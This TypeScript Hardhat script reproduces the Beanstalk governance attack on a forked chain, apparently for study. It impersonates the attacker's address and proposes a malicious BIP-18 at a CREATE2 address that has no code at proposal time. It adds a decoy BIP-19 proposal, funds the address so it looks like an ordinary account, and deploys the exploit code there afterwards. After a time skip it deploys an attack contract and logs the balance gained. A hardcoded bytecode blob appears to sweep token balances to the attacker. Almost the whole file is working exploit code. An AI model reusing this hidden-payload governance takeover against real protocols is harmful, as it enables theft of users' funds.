import { ethers, reset, RPC_URL, expect, time } from "../setup";

import {
	bytecode as bip18Bytecode,
	deployedBytecode as bip18DeployedBytecode,
} from "../artifacts/contracts/Beanstalk/ExploitInitBip18.sol/ExploitInitBip18.json";

const HACKER = "0x1c5dcdd006ea78a7e4783f9e6021c32935a10fb4";
const BEANSTALK = "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5"; // proxy -> 0xf480ee81a54e21be47aa02d0f9e29985bc7667c4
const FACTORY = "0x4e59b44847b379578588920cA78FbF26c0B4956C"; // Foundry Create2Deployer

async function main() {
	await reset(RPC_URL, 14595636);

	const hacker = await ethers.getImpersonatedSigner(HACKER);

	const governance = await ethers.getContractAt(
		"IGovernanceFacet",
		BEANSTALK,
		hacker
	);

	// ? Hacker had 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69 contract address
	// ? Here we use our own written exploit contract, so the address is not matched
	const precomputedExploitInitBip18Address = ethers.getCreate2Address(
		FACTORY,
		ethers.encodeBytes32String(""), // salt: 0
		ethers.keccak256(bip18Bytecode)
	);

	console.log(
		"Precomputed explot bip-18 address:",
		precomputedExploitInitBip18Address
	);

	const initBip18 = await ethers.deployContract("InitBip18", [], {
		signer: hacker,
	});

	const tx = await initBip18.waitForDeployment();
	const fakeBip18Address = tx.target;

	console.log("InitBip18 deployed to:", fakeBip18Address);

	// attack proposal (bip-18)
	await governance.connect(hacker).propose(
		[],
		// 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69
		precomputedExploitInitBip18Address,
		// init()
		"0xe1c7392a",
		3
	);

	// fake proposal (bip-19)
	await governance.connect(hacker).propose(
		[],
		// 0x259a2795624B8a17bC7EB312a94504Ad0F615D1E
		fakeBip18Address,
		// init()
		"0xe1c7392a",
		3
	);

	// transfer to bip-18 address some ETH to make it look like a real EOA address
	await hacker.sendTransaction({
		to: precomputedExploitInitBip18Address,
		value: ethers.parseEther("0.25"),
	});

	expect(
		await ethers.provider.getCode(precomputedExploitInitBip18Address)
	).to.equal("0x");

	// deploy the exploit bip-18 to the precomputed address using foundry factory
	await hacker.sendTransaction({
		to: FACTORY,
		data: ethers.concat([ethers.encodeBytes32String(""), bip18Bytecode]),
	});

	expect(
		await ethers.provider.getCode(precomputedExploitInitBip18Address)
	).to.equal(bip18DeployedBytecode);

	// === Attack ===

	// wait for 24 hours
	await time.increase(60 * 60 * 24 + 1);

	console.log(
		"Balance before hack:",
		ethers.formatEther(await ethers.provider.getBalance(HACKER)) + " ETH"
	);

	// Attack
	const attack = await ethers.deployContract("BeanstalkAttack", [], {
		signer: hacker,
	});

	await attack.waitForDeployment();

	console.log(
		"Balance after hack:",
		ethers.formatEther(await ethers.provider.getBalance(HACKER)) + " ETH"
	);
}

async function test() {
	const bytecode =
		"0x608060405234801561001057600080fd5b5061045c806100206000396000f3fe608060405232731c5dcdd006ea78a7e4783f9e6021c32935a10fb4146100585760405162461bcd60e51b815260206004820152600a6024820152692737ba1029b4b3b732b960b11b604482015260640160405180910390fd5b6040516370a0823160e01b815230600482015273dc59ac4fefa32293a95889dc396682858d52e5db9063a9059cbb90339083906370a0823190602401602060405180830381865afa1580156100b1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d5919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610120573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101449190610426565b506040516370a0823160e01b81523060048201527387898263b6c5babe34b4ec53f22d98430b91e3719063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561019e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c2919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561020d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102319190610426565b506040516370a0823160e01b8152306004820152733a70dfa7d2262988064a2d051dd47521e43c9bdd9063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561028b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102af919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156102fa573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031e9190610426565b506040516370a0823160e01b815230600482015273d652c40fbb3f06d6b58cb9aa9cff063ee63d465d9063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610378573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061039c919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156103e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061040b9190610426565b005b60006020828403121561041f57600080fd5b5051919050565b60006020828403121561043857600080fd5b8151801515811461044857600080fd5b939250505056fea164736f6c634300080d000a";
	const bytecodeHash = ethers.keccak256(bytecode);
	const salt = ethers.encodeBytes32String("");
	// create2 precomputed address
	const address = ethers.getCreate2Address(FACTORY, salt, bytecodeHash);

	console.log("address:", address);
}

async function test2() {
	// const str = ethers.AbiCoder.defaultAbiCoder().encode(
	//     ["uint256", "bytes"],
	//     [0, bip18Bytecode]
	// );
	const data = ethers.concat([ethers.encodeBytes32String(""), bip18Bytecode]);

	const precomputedAddress = ethers.getCreate2Address(
		FACTORY,
		ethers.encodeBytes32String(""),
		ethers.keccak256(bip18Bytecode)
	);

	console.log("precomputedAddress:", precomputedAddress);

	await reset(RPC_URL, 14595636);

	const hacker = await ethers.getImpersonatedSigner(HACKER);

	console.log(
		"Current code:",
		await hacker.provider.getCode(precomputedAddress)
	);

	await hacker.sendTransaction({
		to: FACTORY,
		data,
	});

	console.log("New code:", await hacker.provider.getCode(precomputedAddress));
}

async function test3() {
	await reset(RPC_URL, 14595636);

	const hacker = await ethers.getImpersonatedSigner(HACKER);

	const precomputedExploitInitBip18Address = ethers.getCreate2Address(
		FACTORY,
		ethers.encodeBytes32String(""),
		ethers.keccak256(bip18Bytecode)
	);

	await hacker.sendTransaction({
		to: precomputedExploitInitBip18Address,
		value: ethers.parseEther("0.25"),
	});

	const currentBip18ContractCode = await ethers.provider.getCode(
		precomputedExploitInitBip18Address
	);

	expect(currentBip18ContractCode).to.equal("0x");

	// deploy the exploit bip-18 to the precomputed address using foundry factory
	await hacker.sendTransaction({
		to: FACTORY,
		data: ethers.concat([ethers.encodeBytes32String(""), bip18Bytecode]),
	});

	const newBip18ContractCode = await ethers.provider.getCode(
		precomputedExploitInitBip18Address
	);

	expect(newBip18ContractCode).to.equal(bip18DeployedBytecode);
}

// test3();

main();
